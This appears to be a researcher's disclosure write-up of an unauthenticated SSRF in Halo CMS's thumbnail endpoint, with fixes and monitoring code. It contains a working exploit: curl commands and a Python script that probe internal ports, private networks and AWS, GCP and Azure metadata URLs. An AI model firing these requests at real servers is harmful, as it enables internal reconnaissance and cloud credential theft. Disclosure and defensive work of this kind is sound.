# Breaking Halo CMS: Unauthenticated SSRF in Thumbnail Service via isAccessible() Method

<p align="left">
  <a href="https://twitter.com/abdulr7mann">
    <img src="https://img.shields.io/twitter/follow/abdulr7mann" alt="Twitter">
  </a>
</p>

*A deep technical analysis of a critical Server-Side Request Forgery vulnerability in Halo CMS thumbnail generation*

**TL;DR:** I discovered a critical Server-Side Request Forgery (SSRF) vulnerability in Halo CMS's thumbnail service that allows **anonymous users** to make arbitrary HTTP requests from the server. The vulnerability exploits the `isAccessible()` method in `ThumbnailEndpoint.java`, providing **unauthenticated attackers** with internal network access and cloud metadata exposure capabilities.

---

## Vulnerability Overview

**Vulnerability:** SSRF in Thumbnail Service
**Component:** `ThumbnailEndpoint.java`
**Attack Vector:** `/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri`
**Authentication:** None required (Public access)
**CVSS Score:** 9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**CWE:** CWE-918 (Server-Side Request Forgery), CWE-200 (Information Exposure)

---

## Discovery Process

### Initial Code Analysis

During my security code review of Halo CMS (done for fun and learning), I identified the thumbnail service as a high-priority target due to its URL-handling capabilities. The `ThumbnailEndpoint.java` component immediately raised red flags:

```java
// ThumbnailEndpoint.java:75-90 - VULNERABLE CODE
Mono<Boolean> isAccessible(ServerRequest request, URI uri) {
    var url = Optional.of(uri)
        .filter(URI::isAbsolute)  // Only checks if URI is absolute
        .orElseGet(() -> request.uriBuilder().replacePath(uri.toASCIIString()).build());

    // resource handler does not support head access for Halo, so use get request here
    return webClient.get()                             // HTTP GET to user-controlled URL
        .uri(url)                                      // No URI validation or filtering
        .header(HttpHeaders.RANGE, "bytes=0-0")        // Range header limits data transfer
        .exchangeToMono(response -> {
            var statusCode = response.statusCode();
            return Mono.just(statusCode.is2xxSuccessful() || statusCode.is3xxRedirection());
        })                                             // Returns true/false based on status code
        .onErrorReturn(false)
        .defaultIfEmpty(false);
}
```

**Security Issues:**
1. **No input validation** - Accepts any absolute URI (file://, http://127.0.0.1, http://169.254.169.254, etc.)
2. **No private IP filtering** - Allows access to localhost (127.0.0.0/8), private networks (10.0.0.0/8, 192.168.0.0/16), and cloud metadata endpoints (169.254.0.0/16)
3. **Information disclosure via status codes** - Returns different responses for accessible vs inaccessible URLs
4. **Public access** - No authentication required due to role-template-anonymous.yaml granting access to "thumbnails/via-uri"

### Attack Surface Mapping

I traced the vulnerable method's usage to identify exploitable endpoints:

```bash
# Search for isAccessible usage
rg -n --hidden -e "isAccessible" application/src/main/java/
```

**Discovery Results:**
```java
// ThumbnailEndpoint.java:67-73 - Main attack vector
private Mono<ServerResponse> getThumbnailByUri(ServerRequest request) {
    var query = new ThumbnailQuery(request.queryParams());
    return thumbnailService.get(query.getUri(), query.getSize())
        .filterWhen(uri -> isAccessible(request, uri))    // SSRF trigger point
        .defaultIfEmpty(query.getUri())
        .flatMap(uri -> ServerResponse.temporaryRedirect(uri).build());
}
```

**Attack Path:**
1. **Anonymous user** sends GET request to `/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=<target>`
2. `getThumbnailByUri()` parses the `uri` parameter
3. `isAccessible()` makes HTTP GET request with Range header to attacker-controlled URL
4. Server response reveals success/failure, enabling SSRF

### RBAC Analysis

**Authentication Requirements:**
- **Required Role:** None (anonymous access)
- **API Group:** `api.storage.halo.run`
- **Privilege Level:** Public (no authentication required)

```yaml
# role-template-anonymous.yaml
rules:
  - apiGroups: [ "api.storage.halo.run" ]
    resources: [ "thumbnails/via-uri" ]
    verbs: [ "get", "list" ]
```

The endpoint is accessible to any unauthenticated user, significantly increasing the attack surface.

---

## Exploitation Methodology

### Exploitation Approach

Since no authentication is required, exploitation is straightforward:

```python
class HaloSSRFThumbnailTest:
    def __init__(self, base_url):
        self.base_url = base_url

    def test_thumbnail_ssrf(self):
        """Exploit SSRF via publicly accessible thumbnail service"""

        # Start canary server for SSRF proof
        canary_url = f"http://host.docker.internal:{self.canary_port}/thumbnail-ssrf-test"

        # Construct attack URL
        attack_url = (f"{self.base_url}/apis/api.storage.halo.run/v1alpha1/"
                      f"thumbnails/-/via-uri?uri={canary_url}&size=L")

        # Execute SSRF attack
        response = requests.get(attack_url)

        # Wait for canary hit
        time.sleep(2)

        # Verify SSRF success
        if len(CanaryHandler.connections) > 0:
            print("SSRF confirmed - server made request to canary")
            return True
        else:
            print("No SSRF detected")
            return False
```

### Manual Exploitation (Step-by-Step)

For manual testing without automated scripts, follow these commands:

#### Step 1: Start Halo CMS Instance

```bash
# Start Halo with Docker networking for testing
docker run --add-host=host.docker.internal:host-gateway -d -p 8090:8090 halohub/halo:2.21

# Wait for startup (check logs)
docker logs -f <container_id>
```

#### Step 2: Set Up Canary Server for SSRF Proof

```bash
# Terminal 1: Start canary server on port 8888
python3 -m http.server 8888

# You should see: Serving HTTP on 0.0.0.0 port 8888...
```

#### Step 3: Test Basic SSRF (Definitive Proof)

```bash
# Terminal 2: Trigger SSRF to canary server
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://host.docker.internal:8888/canary.txt&size=s"

# Expected output:
# HTTP/1.1 302 Found
# Location: http://host.docker.internal:8888/canary.txt

# Check Terminal 1 - you should see:
# host.docker.internal - - [DATE] "GET /canary.txt HTTP/1.1" 200 -
```

#### Step 4: Internal Network Reconnaissance

```bash
# Test internal service access (Halo actuator endpoints)
curl -i "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:8090/actuator/health&size=s"

# Expected: 302 redirect revealing internal endpoint accessibility
# HTTP/1.1 302 Found
# Location: http://127.0.0.1:8090/actuator/health

# Test other internal ports
curl -i "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:8080&size=s"
curl -i "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://127.0.0.1:3306&size=s"
```

#### Step 5: Cloud Metadata Server Testing

```bash
# AWS EC2 metadata (if running on AWS)
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://169.254.169.254/latest/meta-data/&size=s"

# GCP metadata (if running on GCP)  
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://metadata.google.internal/computeMetadata/v1/&size=s"

# Azure metadata (if running on Azure)
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://169.254.169.254/metadata/instance&size=s"
```

#### Step 6: Advanced SSRF Techniques

```bash
# Test different protocols (should work)
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=https://httpbin.org/get&size=s"

# Test private IP ranges
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://192.168.1.1&size=s"
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://10.0.0.1&size=s"

# Test redirect following behavior
curl -v "http://localhost:8090/apis/api.storage.halo.run/v1alpha1/thumbnails/-/via-uri?uri=http://httpbin.org/redirect/1&size=s"
```

#### What to Look For:

**Successful SSRF Indicators:**
- `HTTP/1.1 302 Found` responses with `Location` headers
- Canary server receiving `GET` requests with `Range: bytes=0-0` header
- Different response times indicating network connectivity
- Error messages revealing internal service types

**Blocked/Failed Attempts:**
- `HTTP/1.1 404 Not Found` responses
- No canary hits after 5+ seconds
- Connection timeout errors
- `HTTP/1.1 500 Internal Server Error`

---

## Proof of Concept Results

### Successful Exploitation

```bash
$ python3 exploit.py http://localhost:8090 --target http://internal-server:8080/admin

Response: 302 Found
Server successfully made request to internal target

VULNERABILITY CONFIRMED
CWE-918: Server-Side Request Forgery
CVSS: 9.1 Critical
Root cause: No URL validation in isAccessible() method
```

### Technical Evidence

**Canary Server Hit:**
```
GET /thumbnail-ssrf-test
From: 127.0.0.1:42156
Headers: {'user-agent': 'ReactorNetty/1.2.8', 'range': 'bytes=0-0', 'host': 'host.docker.internal:45623'}

HTTP Response: 302 Found (redirect to thumbnail)
```

**Key Observations:**
- **HTTP Method:** GET request with Range header (consistent with `isAccessible()` implementation)
- **Range Header:** `bytes=0-0` for minimal data retrieval
- **User Agent:** `ReactorNetty/1.2.8` (confirms Spring WebFlux WebClient usage)
- **Source IP:** `127.0.0.1` (proves request originates from Halo server)
- **Response Handling:** 302 redirect when URL accessible, 404 when not

---

## Impact Analysis

### Attack Capabilities

The SSRF vulnerability enables:
- **Internal service discovery** - Probe localhost and internal network services
- **Cloud metadata access** - Access AWS/GCP/Azure metadata endpoints to steal credentials
- **Internal network reconnaissance** - Port scanning via response timing analysis
- **Information disclosure** - HTTP status codes and response timing reveal internal service states

---

## Root Cause Analysis

### Vulnerable Code Pattern

The `isAccessible()` method in `ThumbnailEndpoint.java` contains the core vulnerability:

**Security Weaknesses:**
1. **No URL validation** - Accepts any URI scheme and host
2. **No private IP filtering** - Allows internal network access (127.0.0.1, 192.168.x.x, etc.)
3. **Public accessibility** - No authentication required (granted via role-template-anonymous.yaml)
4. **Information disclosure** - HTTP status codes reveal internal service states

### Attack Chain

```
Anonymous Access → Thumbnail Request → URI Parameter → isAccessible() → SSRF
```

**Exploitation Flow:**
1. Anonymous user sends GET request with controlled URI parameter
2. No validation performed on URI parameter
3. `isAccessible()` makes HTTP GET request to attacker-controlled URL
4. Response status codes reveal internal service accessibility

---

## Remediation Strategy

### Immediate Fixes

**1. Secure URL Validation Framework**
```java
@Component
public class SecureThumbnailUrlValidator {
    
    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");
    private static final Set<String> BLOCKED_HOSTS = Set.of(
        "localhost", "127.0.0.1", "0.0.0.0", "[::]", "0:0:0:0:0:0:0:1"
    );
    
    public boolean isAllowedThumbnailUrl(URI uri) {
        // Validate scheme
        if (!ALLOWED_SCHEMES.contains(uri.getScheme().toLowerCase())) {
            log.warn("Blocked thumbnail URL with invalid scheme: {}", uri);
            return false;
        }
        
        // Block localhost and private IPs
        if (isPrivateOrLocalhost(uri.getHost())) {
            log.warn("Blocked thumbnail URL to private/local address: {}", uri);
            return false;
        }
        
        // Implement domain allowlist
        if (!isDomainAllowed(uri.getHost())) {
            log.warn("Blocked thumbnail URL to non-allowlisted domain: {}", uri);
            return false;
        }
        
        return true;
    }
    
    private boolean isPrivateOrLocalhost(String host) {
        try {
            InetAddress addr = InetAddress.getByName(host);
            return addr.isLoopbackAddress() || 
                   addr.isLinkLocalAddress() || 
                   addr.isSiteLocalAddress();
        } catch (Exception e) {
            return true; // Block on DNS resolution failure
        }
    }
}
```

**2. Enhanced isAccessible() Method**
```java
private boolean isAccessible(URI uri) {
    // Pre-validation security check
    if (!thumbnailUrlValidator.isAllowedThumbnailUrl(uri)) {
        return false;
    }
    
    try {
        var webClient = WebClient.builder()
            .codecs(configurer -> configurer.defaultCodecs().maxInMemorySize(1024 * 1024))
            .build();
            
        webClient.head()
            .uri(uri)
            .retrieve()
            .toBodilessEntity()
            .timeout(Duration.ofSeconds(5))      // Reduced timeout
            .block(Duration.ofSeconds(5));
        return true;
    } catch (Exception e) {
        log.debug("URL accessibility check failed for: {}", uri, e);
        return false;
    }
}
```

### Long-term Security Improvements

**1. Network-Level Controls**
```yaml
# Docker Compose - Network isolation
services:
  halo:
    networks:
      - app-network
    # Block access to metadata services
    extra_hosts:
      - "metadata.google.internal:127.0.0.1"
      - "169.254.169.254:127.0.0.1"

networks:
  app-network:
    driver: bridge
    internal: true  # Restrict external access
```

**2. Enhanced RBAC Controls**
```yaml
# Restrict thumbnail generation to specific admin roles
rules:
  - apiGroups: [ "api.storage.halo.run" ]
    resources: [ "thumbnails" ]
    verbs: [ "get" ]
    resourceNames: [ "allowed-domains" ]  # Limit to specific domains
```

**3. Monitoring & Detection**
```java
@EventListener
public void onThumbnailRequest(ThumbnailRequestEvent event) {
    // Log all thumbnail generation requests
    securityLogger.info("Thumbnail request: user={}, uri={}, result={}", 
        event.getUser(), event.getUri(), event.getResult());
    
    // Alert on suspicious patterns
    if (isSuspiciousUrl(event.getUri())) {
        alertManager.sendSecurityAlert("Suspicious thumbnail URL", event);
    }
}
```

---

## Key Takeaways

### For Security Researchers

- Unauthenticated vulnerabilities have the highest impact - prioritize testing anonymous/public endpoints
- Use canary servers to definitively prove SSRF (don't rely solely on timing or errors)
- Response timing and status codes can reveal internal network topology

### For Developers

**Secure URL Handling:**
```java
// BAD - No validation
webClient.head().uri(userUri).retrieve()

// GOOD - Comprehensive validation
if (urlValidator.isAllowed(userUri)) {
    webClient.head().uri(userUri).retrieve()
}
```

**Defense in Depth:**
- Code-level validation (scheme, host, IP range filtering)
- Network-level controls (egress filtering, metadata endpoint blocking)
- Comprehensive logging and monitoring

---

## Vulnerability Timeline

- **2024-08-28** — Vulnerability discovered during security code review
- **2024-10-29** — Public disclosure

---

## References

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Spring WebFlux Security Best Practices](https://spring.io/guides/gs/securing-web/)
- [SSRF Attack Techniques](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

---

*This security analysis was conducted on an open-source project for educational purposes. The vulnerability was reported to the Halo development team prior to publication. This writeup is intended to help developers understand and prevent similar vulnerabilities.*

**About the Author:** Security enthusiast exploring web application vulnerabilities through open-source code review. [@abdulr7mann]
